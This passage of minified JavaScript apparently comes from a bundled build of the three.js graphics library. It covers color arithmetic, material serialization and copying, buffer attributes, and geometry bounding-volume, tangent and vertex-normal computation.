${s.toFixed(3)})`:`rgb(${Math.round(n*255)},${Math.round(i*255)},${Math.round(s*255)})`}offsetHSL(e,n,i){return this.getHSL(Hi),this.setHSL(Hi.h+e,Hi.s+n,Hi.l+i)}add(e){return this.r+=e.r,this.g+=e.g,this.b+=e.b,this}addColors(e,n){return this.r=e.r+n.r,this.g=e.g+n.g,this.b=e.b+n.b,this}addScalar(e){return this.r+=e,this.g+=e,this.b+=e,this}sub(e){return this.r=Math.max(0,this.r-e.r),this.g=Math.max(0,this.g-e.g),this.b=Math.max(0,this.b-e.b),this}multiply(e){return this.r*=e.r,this.g*=e.g,this.b*=e.b,this}multiplyScalar(e){return this.r*=e,this.g*=e,this.b*=e,this}lerp(e,n){return this.r+=(e.r-this.r)*n,this.g+=(e.g-this.g)*n,this.b+=(e.b-this.b)*n,this}lerpColors(e,n,i){return this.r=e.r+(n.r-e.r)*i,this.g=e.g+(n.g-e.g)*i,this.b=e.b+(n.b-e.b)*i,this}lerpHSL(e,n){this.getHSL(Hi),e.getHSL(Fo);const i=$c(Hi.h,Fo.h,n),s=$c(Hi.s,Fo.s,n),r=$c(Hi.l,Fo.l,n);return this.setHSL(i,s,r),this}setFromVector3(e){return this.r=e.x,this.g=e.y,this.b=e.z,this}applyMatrix3(e){const n=this.r,i=this.g,s=this.b,r=e.elements;return this.r=r[0]*n+r[3]*i+r[6]*s,this.g=r[1]*n+r[4]*i+r[7]*s,this.b=r[2]*n+r[5]*i+r[8]*s,this}equals(e){return e.r===this.r&&e.g===this.g&&e.b===this.b}fromArray(e,n=0){return this.r=e[n],this.g=e[n+1],this.b=e[n+2],this}toArray(e=[],n=0){return e[n]=this.r,e[n+1]=this.g,e[n+2]=this.b,e}fromBufferAttribute(e,n){return this.r=e.getX(n),this.g=e.getY(n),this.b=e.getZ(n),this}toJSON(){return this.getHex()}*[Symbol.iterator](){yield this.r,yield this.g,yield this.b}}const jt=new Xe;Xe.NAMES=ay;let nM=0;class ao extends Wr{constructor(){super(),this.isMaterial=!0,Object.defineProperty(this,"id",{value:nM++}),this.uuid=io(),this.name="",this.type="Material",this.blending=Tr,this.side=ds,this.vertexColors=!1,this.opacity=1,this.transparent=!1,this.alphaHash=!1,this.blendSrc=Sd,this.blendDst=wd,this.blendEquation=As,this.blendSrcAlpha=null,this.blendDstAlpha=null,this.blendEquationAlpha=null,this.blendColor=new Xe(0,0,0),this.blendAlpha=0,this.depthFunc=Dr,this.depthTest=!0,this.depthWrite=!0,this.stencilWriteMask=255,this.stencilFunc=pm,this.stencilRef=0,this.stencilFuncMask=255,this.stencilFail=qs,this.stencilZFail=qs,this.stencilZPass=qs,this.stencilWrite=!1,this.clippingPlanes=null,this.clipIntersection=!1,this.clipShadows=!1,this.shadowSide=null,this.colorWrite=!0,this.precision=null,this.polygonOffset=!1,this.polygonOffsetFactor=0,this.polygonOffsetUnits=0,this.dithering=!1,this.alphaToCoverage=!1,this.premultipliedAlpha=!1,this.forceSinglePass=!1,this.allowOverride=!0,this.visible=!0,this.toneMapped=!0,this.userData={},this.version=0,this._alphaTest=0}get alphaTest(){return this._alphaTest}set alphaTest(e){this._alphaTest>0!=e>0&&this.version++,this._alphaTest=e}onBeforeRender(){}onBeforeCompile(){}customProgramCacheKey(){return this.onBeforeCompile.toString()}setValues(e){if(e!==void 0)for(const n in e){const i=e[n];if(i===void 0){Ie(`Material: parameter '${n}' has value of undefined.`);continue}const s=this[n];if(s===void 0){Ie(`Material: '${n}' is not a property of THREE.${this.type}.`);continue}s&&s.isColor?s.set(i):s&&s.isVector3&&i&&i.isVector3?s.copy(i):this[n]=i}}toJSON(e){const n=e===void 0||typeof e=="string";n&&(e={textures:{},images:{}});const i={metadata:{version:4.7,type:"Material",generator:"Material.toJSON"}};i.uuid=this.uuid,i.type=this.type,this.name!==""&&(i.name=this.name),this.color&&this.color.isColor&&(i.color=this.color.getHex()),this.roughness!==void 0&&(i.roughness=this.roughness),this.metalness!==void 0&&(i.metalness=this.metalness),this.sheen!==void 0&&(i.sheen=this.sheen),this.sheenColor&&this.sheenColor.isColor&&(i.sheenColor=this.sheenColor.getHex()),this.sheenRoughness!==void 0&&(i.sheenRoughness=this.sheenRoughness),this.emissive&&this.emissive.isColor&&(i.emissive=this.emissive.getHex()),this.emissiveIntensity!==void 0&&this.emissiveIntensity!==1&&(i.emissiveIntensity=this.emissiveIntensity),this.specular&&this.specular.isColor&&(i.specular=this.specular.getHex()),this.specularIntensity!==void 0&&(i.specularIntensity=this.specularIntensity),this.specularColor&&this.specularColor.isColor&&(i.specularColor=this.specularColor.getHex()),this.shininess!==void 0&&(i.shininess=this.shininess),this.clearcoat!==void 0&&(i.clearcoat=this.clearcoat),this.clearcoatRoughness!==void 0&&(i.clearcoatRoughness=this.clearcoatRoughness),this.clearcoatMap&&this.clearcoatMap.isTexture&&(i.clearcoatMap=this.clearcoatMap.toJSON(e).uuid),this.clearcoatRoughnessMap&&this.clearcoatRoughnessMap.isTexture&&(i.clearcoatRoughnessMap=this.clearcoatRoughnessMap.toJSON(e).uuid),this.clearcoatNormalMap&&this.clearcoatNormalMap.isTexture&&(i.clearcoatNormalMap=this.clearcoatNormalMap.toJSON(e).uuid,i.clearcoatNormalScale=this.clearcoatNormalScale.toArray()),this.sheenColorMap&&this.sheenColorMap.isTexture&&(i.sheenColorMap=this.sheenColorMap.toJSON(e).uuid),this.sheenRoughnessMap&&this.sheenRoughnessMap.isTexture&&(i.sheenRoughnessMap=this.sheenRoughnessMap.toJSON(e).uuid),this.dispersion!==void 0&&(i.dispersion=this.dispersion),this.iridescence!==void 0&&(i.iridescence=this.iridescence),this.iridescenceIOR!==void 0&&(i.iridescenceIOR=this.iridescenceIOR),this.iridescenceThicknessRange!==void 0&&(i.iridescenceThicknessRange=this.iridescenceThicknessRange),this.iridescenceMap&&this.iridescenceMap.isTexture&&(i.iridescenceMap=this.iridescenceMap.toJSON(e).uuid),this.iridescenceThicknessMap&&this.iridescenceThicknessMap.isTexture&&(i.iridescenceThicknessMap=this.iridescenceThicknessMap.toJSON(e).uuid),this.anisotropy!==void 0&&(i.anisotropy=this.anisotropy),this.anisotropyRotation!==void 0&&(i.anisotropyRotation=this.anisotropyRotation),this.anisotropyMap&&this.anisotropyMap.isTexture&&(i.anisotropyMap=this.anisotropyMap.toJSON(e).uuid),this.map&&this.map.isTexture&&(i.map=this.map.toJSON(e).uuid),this.matcap&&this.matcap.isTexture&&(i.matcap=this.matcap.toJSON(e).uuid),this.alphaMap&&this.alphaMap.isTexture&&(i.alphaMap=this.alphaMap.toJSON(e).uuid),this.lightMap&&this.lightMap.isTexture&&(i.lightMap=this.lightMap.toJSON(e).uuid,i.lightMapIntensity=this.lightMapIntensity),this.aoMap&&this.aoMap.isTexture&&(i.aoMap=this.aoMap.toJSON(e).uuid,i.aoMapIntensity=this.aoMapIntensity),this.bumpMap&&this.bumpMap.isTexture&&(i.bumpMap=this.bumpMap.toJSON(e).uuid,i.bumpScale=this.bumpScale),this.normalMap&&this.normalMap.isTexture&&(i.normalMap=this.normalMap.toJSON(e).uuid,i.normalMapType=this.normalMapType,i.normalScale=this.normalScale.toArray()),this.displacementMap&&this.displacementMap.isTexture&&(i.displacementMap=this.displacementMap.toJSON(e).uuid,i.displacementScale=this.displacementScale,i.displacementBias=this.displacementBias),this.roughnessMap&&this.roughnessMap.isTexture&&(i.roughnessMap=this.roughnessMap.toJSON(e).uuid),this.metalnessMap&&this.metalnessMap.isTexture&&(i.metalnessMap=this.metalnessMap.toJSON(e).uuid),this.emissiveMap&&this.emissiveMap.isTexture&&(i.emissiveMap=this.emissiveMap.toJSON(e).uuid),this.specularMap&&this.specularMap.isTexture&&(i.specularMap=this.specularMap.toJSON(e).uuid),this.specularIntensityMap&&this.specularIntensityMap.isTexture&&(i.specularIntensityMap=this.specularIntensityMap.toJSON(e).uuid),this.specularColorMap&&this.specularColorMap.isTexture&&(i.specularColorMap=this.specularColorMap.toJSON(e).uuid),this.envMap&&this.envMap.isTexture&&(i.envMap=this.envMap.toJSON(e).uuid,this.combine!==void 0&&(i.combine=this.combine)),this.envMapRotation!==void 0&&(i.envMapRotation=this.envMapRotation.toArray()),this.envMapIntensity!==void 0&&(i.envMapIntensity=this.envMapIntensity),this.reflectivity!==void 0&&(i.reflectivity=this.reflectivity),this.refractionRatio!==void 0&&(i.refractionRatio=this.refractionRatio),this.gradientMap&&this.gradientMap.isTexture&&(i.gradientMap=this.gradientMap.toJSON(e).uuid),this.transmission!==void 0&&(i.transmission=this.transmission),this.transmissionMap&&this.transmissionMap.isTexture&&(i.transmissionMap=this.transmissionMap.toJSON(e).uuid),this.thickness!==void 0&&(i.thickness=this.thickness),this.thicknessMap&&this.thicknessMap.isTexture&&(i.thicknessMap=this.thicknessMap.toJSON(e).uuid),this.attenuationDistance!==void 0&&this.attenuationDistance!==1/0&&(i.attenuationDistance=this.attenuationDistance),this.attenuationColor!==void 0&&(i.attenuationColor=this.attenuationColor.getHex()),this.size!==void 0&&(i.size=this.size),this.shadowSide!==null&&(i.shadowSide=this.shadowSide),this.sizeAttenuation!==void 0&&(i.sizeAttenuation=this.sizeAttenuation),this.blending!==Tr&&(i.blending=this.blending),this.side!==ds&&(i.side=this.side),this.vertexColors===!0&&(i.vertexColors=!0),this.opacity<1&&(i.opacity=this.opacity),this.transparent===!0&&(i.transparent=!0),this.blendSrc!==Sd&&(i.blendSrc=this.blendSrc),this.blendDst!==wd&&(i.blendDst=this.blendDst),this.blendEquation!==As&&(i.blendEquation=this.blendEquation),this.blendSrcAlpha!==null&&(i.blendSrcAlpha=this.blendSrcAlpha),this.blendDstAlpha!==null&&(i.blendDstAlpha=this.blendDstAlpha),this.blendEquationAlpha!==null&&(i.blendEquationAlpha=this.blendEquationAlpha),this.blendColor&&this.blendColor.isColor&&(i.blendColor=this.blendColor.getHex()),this.blendAlpha!==0&&(i.blendAlpha=this.blendAlpha),this.depthFunc!==Dr&&(i.depthFunc=this.depthFunc),this.depthTest===!1&&(i.depthTest=this.depthTest),this.depthWrite===!1&&(i.depthWrite=this.depthWrite),this.colorWrite===!1&&(i.colorWrite=this.colorWrite),this.stencilWriteMask!==255&&(i.stencilWriteMask=this.stencilWriteMask),this.stencilFunc!==pm&&(i.stencilFunc=this.stencilFunc),this.stencilRef!==0&&(i.stencilRef=this.stencilRef),this.stencilFuncMask!==255&&(i.stencilFuncMask=this.stencilFuncMask),this.stencilFail!==qs&&(i.stencilFail=this.stencilFail),this.stencilZFail!==qs&&(i.stencilZFail=this.stencilZFail),this.stencilZPass!==qs&&(i.stencilZPass=this.stencilZPass),this.stencilWrite===!0&&(i.stencilWrite=this.stencilWrite),this.rotation!==void 0&&this.rotation!==0&&(i.rotation=this.rotation),this.polygonOffset===!0&&(i.polygonOffset=!0),this.polygonOffsetFactor!==0&&(i.polygonOffsetFactor=this.polygonOffsetFactor),this.polygonOffsetUnits!==0&&(i.polygonOffsetUnits=this.polygonOffsetUnits),this.linewidth!==void 0&&this.linewidth!==1&&(i.linewidth=this.linewidth),this.dashSize!==void 0&&(i.dashSize=this.dashSize),this.gapSize!==void 0&&(i.gapSize=this.gapSize),this.scale!==void 0&&(i.scale=this.scale),this.dithering===!0&&(i.dithering=!0),this.alphaTest>0&&(i.alphaTest=this.alphaTest),this.alphaHash===!0&&(i.alphaHash=!0),this.alphaToCoverage===!0&&(i.alphaToCoverage=!0),this.premultipliedAlpha===!0&&(i.premultipliedAlpha=!0),this.forceSinglePass===!0&&(i.forceSinglePass=!0),this.allowOverride===!1&&(i.allowOverride=!1),this.wireframe===!0&&(i.wireframe=!0),this.wireframeLinewidth>1&&(i.wireframeLinewidth=this.wireframeLinewidth),this.wireframeLinecap!=="round"&&(i.wireframeLinecap=this.wireframeLinecap),this.wireframeLinejoin!=="round"&&(i.wireframeLinejoin=this.wireframeLinejoin),this.flatShading===!0&&(i.flatShading=!0),this.visible===!1&&(i.visible=!1),this.toneMapped===!1&&(i.toneMapped=!1),this.fog===!1&&(i.fog=!1),Object.keys(this.userData).length>0&&(i.userData=this.userData);function s(r){const a=[];for(const o in r){const l=r[o];delete l.metadata,a.push(l)}return a}if(n){const r=s(e.textures),a=s(e.images);r.length>0&&(i.textures=r),a.length>0&&(i.images=a)}return i}clone(){return new this.constructor().copy(this)}copy(e){this.name=e.name,this.blending=e.blending,this.side=e.side,this.vertexColors=e.vertexColors,this.opacity=e.opacity,this.transparent=e.transparent,this.blendSrc=e.blendSrc,this.blendDst=e.blendDst,this.blendEquation=e.blendEquation,this.blendSrcAlpha=e.blendSrcAlpha,this.blendDstAlpha=e.blendDstAlpha,this.blendEquationAlpha=e.blendEquationAlpha,this.blendColor.copy(e.blendColor),this.blendAlpha=e.blendAlpha,this.depthFunc=e.depthFunc,this.depthTest=e.depthTest,this.depthWrite=e.depthWrite,this.stencilWriteMask=e.stencilWriteMask,this.stencilFunc=e.stencilFunc,this.stencilRef=e.stencilRef,this.stencilFuncMask=e.stencilFuncMask,this.stencilFail=e.stencilFail,this.stencilZFail=e.stencilZFail,this.stencilZPass=e.stencilZPass,this.stencilWrite=e.stencilWrite;const n=e.clippingPlanes;let i=null;if(n!==null){const s=n.length;i=new Array(s);for(let r=0;r!==s;++r)i[r]=n[r].clone()}return this.clippingPlanes=i,this.clipIntersection=e.clipIntersection,this.clipShadows=e.clipShadows,this.shadowSide=e.shadowSide,this.colorWrite=e.colorWrite,this.precision=e.precision,this.polygonOffset=e.polygonOffset,this.polygonOffsetFactor=e.polygonOffsetFactor,this.polygonOffsetUnits=e.polygonOffsetUnits,this.dithering=e.dithering,this.alphaTest=e.alphaTest,this.alphaHash=e.alphaHash,this.alphaToCoverage=e.alphaToCoverage,this.premultipliedAlpha=e.premultipliedAlpha,this.forceSinglePass=e.forceSinglePass,this.allowOverride=e.allowOverride,this.visible=e.visible,this.toneMapped=e.toneMapped,this.userData=JSON.parse(JSON.stringify(e.userData)),this}dispose(){this.dispatchEvent({type:"dispose"})}set needsUpdate(e){e===!0&&this.version++}}class wp extends ao{constructor(e){super(),this.isMeshBasicMaterial=!0,this.type="MeshBasicMaterial",this.color=new Xe(16777215),this.map=null,this.lightMap=null,this.lightMapIntensity=1,this.aoMap=null,this.aoMapIntensity=1,this.specularMap=null,this.alphaMap=null,this.envMap=null,this.envMapRotation=new hi,this.combine=z0,this.reflectivity=1,this.refractionRatio=.98,this.wireframe=!1,this.wireframeLinewidth=1,this.wireframeLinecap="round",this.wireframeLinejoin="round",this.fog=!0,this.setValues(e)}copy(e){return super.copy(e),this.color.copy(e.color),this.map=e.map,this.lightMap=e.lightMap,this.lightMapIntensity=e.lightMapIntensity,this.aoMap=e.aoMap,this.aoMapIntensity=e.aoMapIntensity,this.specularMap=e.specularMap,this.alphaMap=e.alphaMap,this.envMap=e.envMap,this.envMapRotation.copy(e.envMapRotation),this.combine=e.combine,this.reflectivity=e.reflectivity,this.refractionRatio=e.refractionRatio,this.wireframe=e.wireframe,this.wireframeLinewidth=e.wireframeLinewidth,this.wireframeLinecap=e.wireframeLinecap,this.wireframeLinejoin=e.wireframeLinejoin,this.fog=e.fog,this}}const Tt=new G,Bo=new Je;let iM=0;class ui{constructor(e,n,i=!1){if(Array.isArray(e))throw new TypeError("THREE.BufferAttribute: array should be a Typed Array.");this.isBufferAttribute=!0,Object.defineProperty(this,"id",{value:iM++}),this.name="",this.array=e,this.itemSize=n,this.count=e!==void 0?e.length/n:0,this.normalized=i,this.usage=fm,this.updateRanges=[],this.gpuType=si,this.version=0}onUploadCallback(){}set needsUpdate(e){e===!0&&this.version++}setUsage(e){return this.usage=e,this}addUpdateRange(e,n){this.updateRanges.push({start:e,count:n})}clearUpdateRanges(){this.updateRanges.length=0}copy(e){return this.name=e.name,this.array=new e.array.constructor(e.array),this.itemSize=e.itemSize,this.count=e.count,this.normalized=e.normalized,this.usage=e.usage,this.gpuType=e.gpuType,this}copyAt(e,n,i){e*=this.itemSize,i*=n.itemSize;for(let s=0,r=this.itemSize;s<r;s++)this.array[e+s]=n.array[i+s];return this}copyArray(e){return this.array.set(e),this}applyMatrix3(e){if(this.itemSize===2)for(let n=0,i=this.count;n<i;n++)Bo.fromBufferAttribute(this,n),Bo.applyMatrix3(e),this.setXY(n,Bo.x,Bo.y);else if(this.itemSize===3)for(let n=0,i=this.count;n<i;n++)Tt.fromBufferAttribute(this,n),Tt.applyMatrix3(e),this.setXYZ(n,Tt.x,Tt.y,Tt.z);return this}applyMatrix4(e){for(let n=0,i=this.count;n<i;n++)Tt.fromBufferAttribute(this,n),Tt.applyMatrix4(e),this.setXYZ(n,Tt.x,Tt.y,Tt.z);return this}applyNormalMatrix(e){for(let n=0,i=this.count;n<i;n++)Tt.fromBufferAttribute(this,n),Tt.applyNormalMatrix(e),this.setXYZ(n,Tt.x,Tt.y,Tt.z);return this}transformDirection(e){for(let n=0,i=this.count;n<i;n++)Tt.fromBufferAttribute(this,n),Tt.transformDirection(e),this.setXYZ(n,Tt.x,Tt.y,Tt.z);return this}set(e,n=0){return this.array.set(e,n),this}getComponent(e,n){let i=this.array[e*this.itemSize+n];return this.normalized&&(i=na(i,this.array)),i}setComponent(e,n,i){return this.normalized&&(i=on(i,this.array)),this.array[e*this.itemSize+n]=i,this}getX(e){let n=this.array[e*this.itemSize];return this.normalized&&(n=na(n,this.array)),n}setX(e,n){return this.normalized&&(n=on(n,this.array)),this.array[e*this.itemSize]=n,this}getY(e){let n=this.array[e*this.itemSize+1];return this.normalized&&(n=na(n,this.array)),n}setY(e,n){return this.normalized&&(n=on(n,this.array)),this.array[e*this.itemSize+1]=n,this}getZ(e){let n=this.array[e*this.itemSize+2];return this.normalized&&(n=na(n,this.array)),n}setZ(e,n){return this.normalized&&(n=on(n,this.array)),this.array[e*this.itemSize+2]=n,this}getW(e){let n=this.array[e*this.itemSize+3];return this.normalized&&(n=na(n,this.array)),n}setW(e,n){return this.normalized&&(n=on(n,this.array)),this.array[e*this.itemSize+3]=n,this}setXY(e,n,i){return e*=this.itemSize,this.normalized&&(n=on(n,this.array),i=on(i,this.array)),this.array[e+0]=n,this.array[e+1]=i,this}setXYZ(e,n,i,s){return e*=this.itemSize,this.normalized&&(n=on(n,this.array),i=on(i,this.array),s=on(s,this.array)),this.array[e+0]=n,this.array[e+1]=i,this.array[e+2]=s,this}setXYZW(e,n,i,s,r){return e*=this.itemSize,this.normalized&&(n=on(n,this.array),i=on(i,this.array),s=on(s,this.array),r=on(r,this.array)),this.array[e+0]=n,this.array[e+1]=i,this.array[e+2]=s,this.array[e+3]=r,this}onUpload(e){return this.onUploadCallback=e,this}clone(){return new this.constructor(this.array,this.itemSize).copy(this)}toJSON(){const e={itemSize:this.itemSize,type:this.array.constructor.name,array:Array.from(this.array),normalized:this.normalized};return this.name!==""&&(e.name=this.name),this.usage!==fm&&(e.usage=this.usage),e}}class oy extends ui{constructor(e,n,i){super(new Uint16Array(e),n,i)}}class ly extends ui{constructor(e,n,i){super(new Uint32Array(e),n,i)}}class tn extends ui{constructor(e,n,i){super(new Float32Array(e),n,i)}}let sM=0;const An=new St,fu=new $t,ir=new G,vn=new ro,aa=new ro,It=new G;class Zn extends Wr{constructor(){super(),this.isBufferGeometry=!0,Object.defineProperty(this,"id",{value:sM++}),this.uuid=io(),this.name="",this.type="BufferGeometry",this.index=null,this.indirect=null,this.indirectOffset=0,this.attributes={},this.morphAttributes={},this.morphTargetsRelative=!1,this.groups=[],this.boundingBox=null,this.boundingSphere=null,this.drawRange={start:0,count:1/0},this.userData={}}getIndex(){return this.index}setIndex(e){return Array.isArray(e)?this.index=new(iy(e)?ly:oy)(e,1):this.index=e,this}setIndirect(e,n=0){return this.indirect=e,this.indirectOffset=n,this}getIndirect(){return this.indirect}getAttribute(e){return this.attributes[e]}setAttribute(e,n){return this.attributes[e]=n,this}deleteAttribute(e){return delete this.attributes[e],this}hasAttribute(e){return this.attributes[e]!==void 0}addGroup(e,n,i=0){this.groups.push({start:e,count:n,materialIndex:i})}clearGroups(){this.groups=[]}setDrawRange(e,n){this.drawRange.start=e,this.drawRange.count=n}applyMatrix4(e){const n=this.attributes.position;n!==void 0&&(n.applyMatrix4(e),n.needsUpdate=!0);const i=this.attributes.normal;if(i!==void 0){const r=new Ue().getNormalMatrix(e);i.applyNormalMatrix(r),i.needsUpdate=!0}const s=this.attributes.tangent;return s!==void 0&&(s.transformDirection(e),s.needsUpdate=!0),this.boundingBox!==null&&this.computeBoundingBox(),this.boundingSphere!==null&&this.computeBoundingSphere(),this}applyQuaternion(e){return An.makeRotationFromQuaternion(e),this.applyMatrix4(An),this}rotateX(e){return An.makeRotationX(e),this.applyMatrix4(An),this}rotateY(e){return An.makeRotationY(e),this.applyMatrix4(An),this}rotateZ(e){return An.makeRotationZ(e),this.applyMatrix4(An),this}translate(e,n,i){return An.makeTranslation(e,n,i),this.applyMatrix4(An),this}scale(e,n,i){return An.makeScale(e,n,i),this.applyMatrix4(An),this}lookAt(e){return fu.lookAt(e),fu.updateMatrix(),this.applyMatrix4(fu.matrix),this}center(){return this.computeBoundingBox(),this.boundingBox.getCenter(ir).negate(),this.translate(ir.x,ir.y,ir.z),this}setFromPoints(e){const n=this.getAttribute("position");if(n===void 0){const i=[];for(let s=0,r=e.length;s<r;s++){const a=e[s];i.push(a.x,a.y,a.z||0)}this.setAttribute("position",new tn(i,3))}else{const i=Math.min(e.length,n.count);for(let s=0;s<i;s++){const r=e[s];n.setXYZ(s,r.x,r.y,r.z||0)}e.length>n.count&&Ie("BufferGeometry: Buffer size too small for points data. Use .dispose() and create a new geometry."),n.needsUpdate=!0}return this}computeBoundingBox(){this.boundingBox===null&&(this.boundingBox=new ro);const e=this.attributes.position,n=this.morphAttributes.position;if(e&&e.isGLBufferAttribute){Ze("BufferGeometry.computeBoundingBox(): GLBufferAttribute requires a manual bounding box.",this),this.boundingBox.set(new G(-1/0,-1/0,-1/0),new G(1/0,1/0,1/0));return}if(e!==void 0){if(this.boundingBox.setFromBufferAttribute(e),n)for(let i=0,s=n.length;i<s;i++){const r=n[i];vn.setFromBufferAttribute(r),this.morphTargetsRelative?(It.addVectors(this.boundingBox.min,vn.min),this.boundingBox.expandByPoint(It),It.addVectors(this.boundingBox.max,vn.max),this.boundingBox.expandByPoint(It)):(this.boundingBox.expandByPoint(vn.min),this.boundingBox.expandByPoint(vn.max))}}else this.boundingBox.makeEmpty();(isNaN(this.boundingBox.min.x)||isNaN(this.boundingBox.min.y)||isNaN(this.boundingBox.min.z))&&Ze('BufferGeometry.computeBoundingBox(): Computed min/max have NaN values. The "position" attribute is likely to have NaN values.',this)}computeBoundingSphere(){this.boundingSphere===null&&(this.boundingSphere=new Sp);const e=this.attributes.position,n=this.morphAttributes.position;if(e&&e.isGLBufferAttribute){Ze("BufferGeometry.computeBoundingSphere(): GLBufferAttribute requires a manual bounding sphere.",this),this.boundingSphere.set(new G,1/0);return}if(e){const i=this.boundingSphere.center;if(vn.setFromBufferAttribute(e),n)for(let r=0,a=n.length;r<a;r++){const o=n[r];aa.setFromBufferAttribute(o),this.morphTargetsRelative?(It.addVectors(vn.min,aa.min),vn.expandByPoint(It),It.addVectors(vn.max,aa.max),vn.expandByPoint(It)):(vn.expandByPoint(aa.min),vn.expandByPoint(aa.max))}vn.getCenter(i);let s=0;for(let r=0,a=e.count;r<a;r++)It.fromBufferAttribute(e,r),s=Math.max(s,i.distanceToSquared(It));if(n)for(let r=0,a=n.length;r<a;r++){const o=n[r],l=this.morphTargetsRelative;for(let c=0,h=o.count;c<h;c++)It.fromBufferAttribute(o,c),l&&(ir.fromBufferAttribute(e,c),It.add(ir)),s=Math.max(s,i.distanceToSquared(It))}this.boundingSphere.radius=Math.sqrt(s),isNaN(this.boundingSphere.radius)&&Ze('BufferGeometry.computeBoundingSphere(): Computed radius is NaN. The "position" attribute is likely to have NaN values.',this)}}computeTangents(){const e=this.index,n=this.attributes;if(e===null||n.position===void 0||n.normal===void 0||n.uv===void 0){Ze("BufferGeometry: .computeTangents() failed. Missing required attributes (index, position, normal or uv)");return}const i=n.position,s=n.normal,r=n.uv;this.hasAttribute("tangent")===!1&&this.setAttribute("tangent",new ui(new Float32Array(4*i.count),4));const a=this.getAttribute("tangent"),o=[],l=[];for(let L=0;L<i.count;L++)o[L]=new G,l[L]=new G;const c=new G,h=new G,d=new G,p=new Je,f=new Je,y=new Je,_=new G,g=new G;function u(L,w,M){c.fromBufferAttribute(i,L),h.fromBufferAttribute(i,w),d.fromBufferAttribute(i,M),p.fromBufferAttribute(r,L),f.fromBufferAttribute(r,w),y.fromBufferAttribute(r,M),h.sub(c),d.sub(c),f.sub(p),y.sub(p);const k=1/(f.x*y.y-y.x*f.y);isFinite(k)&&(_.copy(h).multiplyScalar(y.y).addScaledVector(d,-f.y).multiplyScalar(k),g.copy(d).multiplyScalar(f.x).addScaledVector(h,-y.x).multiplyScalar(k),o[L].add(_),o[w].add(_),o[M].add(_),l[L].add(g),l[w].add(g),l[M].add(g))}let v=this.groups;v.length===0&&(v=[{start:0,count:e.count}]);for(let L=0,w=v.length;L<w;++L){const M=v[L],k=M.start,H=M.count;for(let V=k,W=k+H;V<W;V+=3)u(e.getX(V+0),e.getX(V+1),e.getX(V+2))}const x=new G,S=new G,E=new G,A=new G;function C(L){E.fromBufferAttribute(s,L),A.copy(E);const w=o[L];x.copy(w),x.sub(E.multiplyScalar(E.dot(w))).normalize(),S.crossVectors(A,w);const k=S.dot(l[L])<0?-1:1;a.setXYZW(L,x.x,x.y,x.z,k)}for(let L=0,w=v.length;L<w;++L){const M=v[L],k=M.start,H=M.count;for(let V=k,W=k+H;V<W;V+=3)C(e.getX(V+0)),C(e.getX(V+1)),C(e.getX(V+2))}}computeVertexNormals(){const e=this.index,n=this.getAttribute("position");if(n!==void 0){let i=this.getAttribute("normal");if(i===void 0)i=new ui(new Float32Array(n.count*3),3),this.setAttribute("normal",i);else for(let p=0,f=i.count;p<f;p++)i.setXYZ(p,0,0,0);const s=new G,r=new G,a=new G,o=new G,l=new G,c=new G,h=new G,d=new G;if(e)for(let p=0,f=e.count;p<f;p+=3){const y=e.getX(p+0),_=e.getX(p+1),g=e.getX(p+2);s.fromBufferAttribute(n,y),r.fromBufferAttribute(n,_),a.fromBufferAttribute(n,g),h.subVectors(a,r),d.subVectors(s,r),h.cross(d),o.fromBufferAttribute(i,y),l.fromBufferAttribute(i,_),c.fromBufferAttribute(i,g),o.add(h),l.add(h),c.add(h),i.setXYZ(y,o.x,o.y,o.z),i.setXYZ(_,l.x,l.y,l.z),i.setXYZ(g,c.x,c.y,c.z)}else for(let p=0,f=n.count;p<f;p+=3)s.fromBufferAttribute(n,p+0),r.fromBufferAttribute(n,p+1),a.fromBufferAttribute(n,p+2),h.subVectors(a,r),d.subVectors(s,r),h.cross(d),i.setXYZ(p+0,h.x,h.y,h.z),i.setXYZ(p+1,h.x,h.y,h.z),i.setXYZ(p+2,h.x,h.y,h.z);this.normalizeNormals(),i.needsUpdate=!0}}normalizeNormals(){const e=this.attributes.normal;for(let n=0,i=e.count;n<i;n++)It.fromBufferAttribute(e,n),It.normalize(),e.setXYZ(n,It.x,It.y,It.z)}toNonIndexed(){function e(o,l){const c=o.array,h=o.itemSize,d=o.normalized,p=new c.constructor(l.length*h);let f=0,y=0;for(let _=0,g=l.length;_<g;_++){o.isInterleavedBufferAttribute?f=l[_]*o.data.stride+o.offset:f=l[_]*h;for(let u=0;u<h;u++)p[y++]=c[f++]}return new ui(p,h,d)}if(this.index===null)return Ie("BufferGeometry.toNonIndexed(): BufferGeometry is already non-indexed."),this;const n=new Zn,i=this.index.array,s=this.attributes;for(const o in s){const l=s[o],c=e(l,i);n.setAttribute(o,c)}const r=this.morphAttributes;for(const o in r){const l=[],c=r[o];for(let h=0,d=c.length;h<d;h++){const p=c[h],f=e(p,i);l.push(f)}n.morphAttributes[o]=l}n.morphTargetsRelative=this.morphTargetsRelative;const a=this.groups;for(let o=0,l=a.length;o<l;o++){const c=a[o];n.addGroup(c.start,c.count,c.materialIndex)}return n}toJSON(){const e={metadata:{version:4.7,type:"BufferGeometry",generator:"BufferGeometry.toJSON"}};if(e.uuid=this.uuid,e.type=this.type,this.name!==""&&(e.name=this.name),Object.keys(this.userData).length>0&&(e.userData=this.userData),this.parameters!==void 0){const l=this.parameters;for(const c in l)l[c]!==void 0&&(e[c]=l[c]);return e}e.data={attributes:{}};const n=this.index;n!==null&&(e.data.index={type:n.array.constructor.name,array:Array.prototype.slice.call(n.array)});const i=this.attributes;for(const l in i){const c=i[l];e.data.attributes[l]=c.toJSON(e.data)}const s={};let r=!1;for(const l in this.morphAttributes){const c=this.morphAttributes[l],h=[];for(let d=0,p=c.length;d<p;d++){const f=c[d];h.push(f.toJSON(e.data))}h.length>0&&(s[l]=h,r=!0)}r&&(e.data.morphAttributes=s,e.data.morphTargetsRelative=this.morphTargetsRelative);const a=this.groups;a.length>0&&(e.data.groups=JSON.parse(JSON.stringify(a)));const o=this.boundingSphere;return o!==null&&(e.data.boundingSphere=o.toJSON()),e}clone(){return new this.constructor().copy(this)}copy(e){this.index=null,this.attributes={},this.morphAttributes={},this.groups=[],this.boundingBox=null,this.boundingSphere=null;const n={};this.name=e.name;const i=e.index;i!==null&&this.setIndex(i.clone());const s=e.attributes;for(const c in s){const h=s[c];this.setAttribute(c,h.clone(n))}const r=e.morphAttributes;for(const c in r){const h=[],d=r[c];for(let p=0,f=d.length;p<f;p++)h.push(d[p].clone(n));this.morphAttributes[c]=h}this.morphTargetsRelative=e.morphTargetsRelative;const a=e.groups;for(let c=0,h=a.length;c<h;c++){const d=a[c];this.addGroup(d.start,d.count,d.materialIndex)}const 